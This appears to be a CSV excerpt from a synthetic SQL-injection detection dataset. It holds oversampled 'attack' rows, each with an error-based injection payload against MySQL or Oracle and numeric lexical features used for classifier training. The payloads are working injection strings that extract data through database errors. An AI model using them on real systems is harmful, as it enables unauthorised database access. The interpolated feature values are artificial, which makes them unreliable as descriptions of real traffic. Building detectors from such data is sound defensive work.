id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000011,attack,error,-7810 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- vuvj,nearest_attack_euclidean,R000011,0.48474286937146294,331.88946327316785,36.0,3.6780962915268556,92.0,48.0,135.0,56.889463273167834,0.27720097349095985,0.1446265948648486,0.40676229805738673,0.17141013358680482,0.0,0.0,2.7789265463356774,0.0,0.0,2.0,0.0,28.0,0.0,3.0,0.0,24.778926546335676,0.0,0.0,0.8894632731678387,0.11053672683216118,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000012,attack,error,"-4838'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000005,0.04895856077353572,213.41645648394194,38.91670870321161,3.8041199430645123,63.0,37.0,89.33316518715355,24.08329129678839,0.2952096145391665,0.17337707520554224,0.41857043454780707,0.11284287570748418,1.0,0.0,1.0,0.0,1.0,1.0,0.0,16.08329129678839,0.0,0.0,3.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000013,attack,error,"-9740""   )    )    as pxkx where 5305  =  5305 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000024,1.0702925621809751,236.4438678990112,40.186404981966284,3.880949734800454,70.90833893147187,44.186404981966284,96.02368597835954,25.32543800721349,0.2991070745516119,0.18689633462292038,0.40651536311107017,0.10748122771439758,0.0,1.0,1.1627190036067439,0.0,1.0,2.0,0.0,16.0,0.0,0.0,3.1627190036067434,4.162719003606744,0.0,1.0,0.16271900360674357,0.8372809963932564,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.3254380072134873,0.0,1.0,0.16271900360674374,0.16271900360674363,0.8372809963932564,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8372809963932564,0.0,0.8372809963932564,0.8372809963932564,7.0
SMOTE_000014,attack,error,"-5606   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000009,0.1639619934424245,212.4555926297941,38.0,3.7697627210203732,63.0,37.0,89.30372841986272,23.15186420993136,0.29654876372518113,0.17416355964812225,0.4203272174346379,0.1089604591920587,0.07593210496568092,0.0,1.0,0.0,1.0,1.0,0.0,16.07593210496568,0.0,0.0,3.0,3.0,0.07593210496568104,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000015,attack,error,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",nearest_attack_euclidean,R000014,0.7448836082031449,231.98149504067624,33.630782799788676,3.896594634524369,78.72918192076078,43.990747520338125,84.26156559957735,25.0,0.33894235613509066,0.18945870859657904,0.36377209797547577,0.1078268372928545,1.8738434400422654,0.0,0.12615655995773456,0.0,0.12615655995773456,1.8738434400422654,0.0,14.378469679873206,0.0,0.0,4.747686880084531,3.8738434400422657,1.0,0.0,0.0,0.12615655995773456,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.8738434400422654,0.0,0.8738434400422654,0.0,0.0,0.12615655995773456,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.12615655995773456,0.0,1.0,1.0,6.0
SMOTE_000016,attack,error,"1'+  (  select 'nhlx' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",nearest_attack_euclidean,R000020,0.087955845001637,299.66188661937423,37.98529941823366,4.022699413421829,110.82359301880393,42.88239534586929,107.95589825470098,38.0,0.3698147832838826,0.14308372417722862,0.36028021325532944,0.12682127928355932,3.9411976729346465,0.05880232706535349,0.0,0.0,2.0,2.0,0.0,20.0,0.029401163532676855,2.0,5.0,5.970598836467323,0.9852994182336616,0.014700581766338372,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.9852994182336614,0.0,0.9852994182336615,2.0,0.014700581766338483,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.985299418233662
SMOTE_000017,attack,error,"-5606   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000009,0.7392056191194354,212.34419380482603,38.34419380482605,3.7850062008828607,63.0,37.0,89.0,23.344193804826045,0.296689604710248,0.17424627578220914,0.41913293363828685,0.10993118586925599,0.3441938048260478,0.0,1.0,0.0,1.0,1.0,0.0,16.0,0.0,0.0,3.0,3.0,0.3441938048260479,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000018,attack,error,-7864 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   # twpw,nearest_attack_euclidean,R000004,2.007814436481104,331.45784528235095,36.0,3.674162762303766,92.0,48.0,135.0,56.45784528235092,0.27756231785774865,0.1448151223605645,0.4072925316390877,0.17033002814259912,0.0,0.0,1.9156905647018396,0.0,0.0,2.0,0.0,28.0,0.0,3.0,0.0,23.91569056470184,0.0,0.0,0.4578452823509198,0.5421547176490802,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000019,attack,error,"1'   )    )    as clhk where 4607  =  4607 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000023,1.7779930930700025,296.66707143080555,39.11097618973148,4.005439851507846,108.77804762053704,43.0,108.55548809486574,36.33353571540278,0.366636840786187,0.14495823048158005,0.36597055231216236,0.12243437642007056,2.3335357154027814,0.0,1.1109761897314794,0.0,2.0,2.0,0.0,20.0,0.0,2.0,5.0,6.0,1.0,0.0,0.5554880948657396,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.4445119051342603,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.44451190513426
SMOTE_000020,attack,error,"1%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000015,2.164312298718463,257.08334855956207,32.54487296612016,3.6740991027172405,78.578212389945,36.382050813551935,107.7243648306008,34.39872052546435,0.30349408005430994,0.14368991737373923,0.4194587365369573,0.13335726603499354,0.0,4.0,0.0,0.0,0.6179491864480642,2.0,0.0,19.853847559344192,1.9999999999999996,0.6179491864480642,5.0,2.6179491864480644,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.6179491864480642,0.0,0.0,0.6179491864480642,1.308974593224032,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3089745932240321,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3089745932240321,0.0,0.6910254067759679,0.6910254067759679,6.54487296612016
SMOTE_000021,attack,error,"-5996  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000008,1.2607958393119567,333.6427908013546,34.6786045993227,3.541928535882812,84.0716275959362,50.6427908013546,142.26767470372513,56.660697700338645,0.25208614312603383,0.1517600198113663,0.4263319977341403,0.16982183932845954,0.0,0.0,1.0,0.0,0.0,2.0,0.0,29.98209310101595,0.0,1.0179068989840507,0.66069770033865,23.0,0.0,0.0,0.0,0.3393022996613501,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000022,attack,error,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'tuzl'  =  'tuzl",nearest_attack_euclidean,R000018,2.4825141882898,219.95486961474694,31.0,3.829407165482203,73.87003725292945,37.0,82.95486961474693,26.12996274707055,0.3381849035093118,0.16885045977942714,0.37479694622212123,0.11816769048913989,2.435018626464725,1.5649813735352753,0.0,0.0,0.0,2.0,0.0,14.347472060302913,0.7824906867676378,0.0,5.0,2.0,0.6087546566161811,0.39124534338381894,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000023,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,1.4250520936116389,264.1091205221861,36.0,4.023365741791782,102.46110749242423,35.0,93.83491856709956,32.813094462662335,0.387573043070503,0.13281125643777278,0.3553657402857155,0.12424996020600873,2.813094462662336,0.0,0.0,0.0,2.0,1.6043648208874455,0.0,18.0,0.0,2.0,5.3956351791125545,3.6043648208874455,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.2087296417748907,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,9.208729641774891
SMOTE_000024,attack,error,"-6236'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000031,1.2764429032625357,221.45893815108144,36.91908182778705,3.780429982317343,66.89130541996661,38.72946907554071,90.8381636555741,25.0,0.30134853520808025,0.17460682872417987,0.41106089604141344,0.11298374002632644,1.2161836344425896,0.0,0.7838163655574105,0.0,0.7838163655574105,1.2161836344425896,0.0,16.351449096672233,0.0,0.0,3.432367268885179,3.216183634442589,1.0,0.0,0.0,0.7838163655574105,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.2161836344425894,0.0,0.21618363444258948,0.0,0.0,0.7838163655574104,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7838163655574104,0.0,1.0,1.0,6.0
